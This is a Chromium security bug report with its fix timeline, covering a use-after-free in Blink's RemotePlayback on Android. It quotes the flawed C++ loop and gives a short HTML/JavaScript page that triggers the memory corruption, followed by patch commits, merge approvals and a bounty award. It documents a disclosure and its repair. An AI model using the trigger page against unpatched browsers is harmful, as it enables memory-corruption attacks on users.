# Security: UAF in RemotePlayback due to iterator invalidation (Android only)

| Field | Value |
|-------|-------|
| **Issue ID** | [40052916](https://issues.chromium.org/issues/40052916) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Media>RemotePlayback |
| **Platforms** | Android |
| **Reporter** | tj...@theori.io |
| **Assignee** | tg...@chromium.org |
| **Created** | 2020-07-22 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

In remote\_playback.cc:

void RemotePlayback::AvailabilityChanged(  

mojom::blink::ScreenAvailability availability) {  

DCHECK(is\_listening\_);  

DCHECK\_NE(availability, mojom::ScreenAvailability::UNKNOWN);  

DCHECK\_NE(availability, mojom::ScreenAvailability::DISABLED);

if (availability\_ == availability)  

return;

bool old\_availability = RemotePlaybackAvailable();  

availability\_ = availability;  

bool new\_availability = RemotePlaybackAvailable();  

if (new\_availability == old\_availability)  

return;

for (auto& callback : availability\_callbacks\_.Values())  

callback->Run(this, new\_availability); // invokes user script; can invalidate the iterator for the for loop  

}

If the callback adds enough elements to |availability\_callbacks\_|, it's backing will be reallocated, invalidating the iterator of the for loop. This will cause |callback->Run(...)| to run on a stale callback pointer.

Note: This bug requires no user interaction, but can only be reached if |new\_availability != old\_availability|, meaning we need a remote playback device to be available (e.g. a remote playback device exists on device's network).

**REPRODUCTION CASE**

Place any valid wav file at /wav.wav

<html>
<head>
<script>
function trigger() {
let audio = new Audio('/wav.wav');
document.body.appendChild(audio);
function callback(v) {
if (v)
for (var i = 0; i < 4; i++)
audio.remote.watchAvailability((v) => {i});
}
audio.addEventListener('canplay', function() {
for (var i = 0; i < 4; i++) audio.remote.watchAvailability(callback);
});
}
</script>
</head>
<body onload="trigger()">
</body>
</html>

PATCH  

A copy of the availability\_callbacks\_.Values() should be iterated instead.

**CREDIT INFORMATION**  

Reporter credit: Tim Becker of Theori

## Timeline

### aj...@google.com (2020-07-22)

Thanks for the report. CC'ing based on recent blame. Please investigate this security issue.

Setting as High as the preconditions are easy to meet e.g. in a captive portal type attack.

### aj...@google.com (2020-07-22)

Adding component.

[Monorail components: Blink>Media>RemotePlayback]

### ml...@google.com (2020-07-22)

[Empty comment from Monorail migration]

### tg...@chromium.org (2020-07-22)

I don't have an Android device to test this. However, the unittest I added does fail without the fix:
https://chromium-review.googlesource.com/c/chromium/src/+/2314981

It should be patched soon.

### [Deleted User] (2020-07-23)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@google.com (2020-07-23)

Thanks! Please mark this as Fixed once the CL lands to start the Stable merge process.

### tg...@chromium.org (2020-07-24)

This is being held up by the closed tree/bad CQ today.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d6426d7a0eb5d61352ee2421ce6706b1d04903bc

commit d6426d7a0eb5d61352ee2421ce6706b1d04903bc
Author: Thomas Guilbert <tguilbert@chromium.org>
Date: Sat Jul 25 16:06:33 2020

Fix iterator invalidation issue

If a RemotePlayback availabilityCallback invokes watchAvailability(),
it may cause changes to the underlying |availability_callbacks_|. This
can invalidate the iterator we are using to loop over the callbacks.

This CL copies the callbacks to a vector before invoking them, allowing
them to add/remove callbacks without problem.

Bug: 1108497
Change-Id: I78220da0b8e10c1d6c0e4fa5e15ada81f10f8fc3
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2314981
Auto-Submit: Thomas Guilbert <tguilbert@chromium.org>
Reviewed-by: Mounir Lamouri <mlamouri@chromium.org>
Commit-Queue: Thomas Guilbert <tguilbert@chromium.org>
Cr-Commit-Position: refs/heads/master@{#791472}

[modify] https://crrev.com/d6426d7a0eb5d61352ee2421ce6706b1d04903bc/third_party/blink/renderer/modules/remoteplayback/remote_playback.cc
[modify] https://crrev.com/d6426d7a0eb5d61352ee2421ce6706b1d04903bc/third_party/blink/renderer/modules/remoteplayback/remote_playback_test.cc


### aj...@google.com (2020-07-27)

Hi, can this bug be marked as Fixed? (This starts the merge process for security fixes).

### tg...@chromium.org (2020-07-27)

Yes!

### [Deleted User] (2020-07-27)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-27)

Requesting merge to stable M84 because latest trunk commit (791472) appears to be after stable branch point (768962).

Requesting merge to beta M85 because latest trunk commit (791472) appears to be after beta branch point (782793).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-07-27)

This bug requires manual review: M85's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), dgagnon@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2020-07-27)

+adetaylor@ (Security TPM) for M84 and M85 merge review. 

### ad...@chromium.org (2020-07-27)

Approving merge to M85, branch 4183, assuming all looks well in canary. I'll approve merge to M84 when we're closer to making a stable refresh.

### tg...@chromium.org (2020-07-27)

Merge CL:
https://chromium-review.googlesource.com/c/chromium/src/+/2321225

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/dc40de5ea0740eae22eed716a9c2729db7d6f1ba

commit dc40de5ea0740eae22eed716a9c2729db7d6f1ba
Author: Thomas Guilbert <tguilbert@chromium.org>
Date: Tue Jul 28 02:35:50 2020

[M85] Fix iterator invalidation issue

If a RemotePlayback availabilityCallback invokes watchAvailability(),
it may cause changes to the underlying |availability_callbacks_|. This
can invalidate the iterator we are using to loop over the callbacks.

This CL copies the callbacks to a vector before invoking them, allowing
them to add/remove callbacks without problem.

(cherry picked from commit d6426d7a0eb5d61352ee2421ce6706b1d04903bc)

TBR: mlamouri@chromium.org
Bug: 1108497
Change-Id: I78220da0b8e10c1d6c0e4fa5e15ada81f10f8fc3
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2314981
Auto-Submit: Thomas Guilbert <tguilbert@chromium.org>
Reviewed-by: Mounir Lamouri <mlamouri@chromium.org>
Commit-Queue: Thomas Guilbert <tguilbert@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#791472}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2321225
Reviewed-by: Thomas Guilbert <tguilbert@chromium.org>
Cr-Commit-Position: refs/branch-heads/4183@{#984}
Cr-Branched-From: 740e9e8a40505392ba5c8e022a8024b3d018ca65-refs/heads/master@{#782793}

[modify] https://crrev.com/dc40de5ea0740eae22eed716a9c2729db7d6f1ba/third_party/blink/renderer/modules/remoteplayback/remote_playback.cc
[modify] https://crrev.com/dc40de5ea0740eae22eed716a9c2729db7d6f1ba/third_party/blink/renderer/modules/remoteplayback/remote_playback_test.cc


### ad...@google.com (2020-08-03)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-03)

If no problems have arisen, please merge to M84, branch 4147.

### tg...@chromium.org (2020-08-03)

Merging CL is in the CQ:
https://chromium-review.googlesource.com/c/chromium/src/+/2335321

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2241c4b158ee77d33dd3232a418f10b6adc9fe02

commit 2241c4b158ee77d33dd3232a418f10b6adc9fe02
Author: Thomas Guilbert <tguilbert@chromium.org>
Date: Tue Aug 04 01:23:47 2020

[M84] Fix iterator invalidation issue

If a RemotePlayback availabilityCallback invokes watchAvailability(),
it may cause changes to the underlying |availability_callbacks_|. This
can invalidate the iterator we are using to loop over the callbacks.

This CL copies the callbacks to a vector before invoking them, allowing
them to add/remove callbacks without problem.

(cherry picked from commit d6426d7a0eb5d61352ee2421ce6706b1d04903bc)

Bug: 1108497
Change-Id: I78220da0b8e10c1d6c0e4fa5e15ada81f10f8fc3
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2314981
Auto-Submit: Thomas Guilbert <tguilbert@chromium.org>
Reviewed-by: Mounir Lamouri <mlamouri@chromium.org>
Commit-Queue: Thomas Guilbert <tguilbert@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#791472}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2335321
Reviewed-by: Thomas Guilbert <tguilbert@chromium.org>
Cr-Commit-Position: refs/branch-heads/4147@{#1016}
Cr-Branched-From: 16307825352720ae04d898f37efa5449ad68b606-refs/heads/master@{#768962}

[modify] https://crrev.com/2241c4b158ee77d33dd3232a418f10b6adc9fe02/third_party/blink/renderer/modules/remoteplayback/remote_playback.cc
[modify] https://crrev.com/2241c4b158ee77d33dd3232a418f10b6adc9fe02/third_party/blink/renderer/modules/remoteplayback/remote_playback_test.cc


### mm...@chromium.org (2020-08-05)

tguilbert@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### tg...@chromium.org (2020-08-05)

I filled out the form. Should the VulnerabilityAnalysis-Requested label be removed?

### ad...@google.com (2020-08-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-08-05)

Congratulations! The VRP panel decided to award $7,500 for this report as well...

### ad...@google.com (2020-08-06)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-07)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-07)

[Empty comment from Monorail migration]

### mm...@google.com (2020-08-11)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1108497?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052916)*
